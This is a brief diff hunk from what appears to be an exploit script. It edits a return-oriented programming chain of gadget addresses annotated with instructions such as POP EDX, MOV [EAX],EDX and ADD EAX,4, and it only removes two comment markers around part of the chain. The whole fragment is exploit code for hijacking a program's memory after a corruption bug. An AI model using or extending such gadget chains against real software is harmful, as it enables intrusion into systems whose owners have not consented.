@@ -42,12 +42,9 @@ magic_offset,
 0x7880A254,  # POP EDX, RETN
 0x00000000,  # NULL
 0x78907a82,  # MOV [EAX],EDX # RETN
-
-#new addition
 0x7887b821,  # ADD EAX,4 # RETN
 0x78830e9a,  # MOV EAX,[EAX] # RETN
 0x78907a82,  # MOV [EAX],EDX # RETN
-#finished
 
 
 0x78833e3c,  # POP EAX # RETN
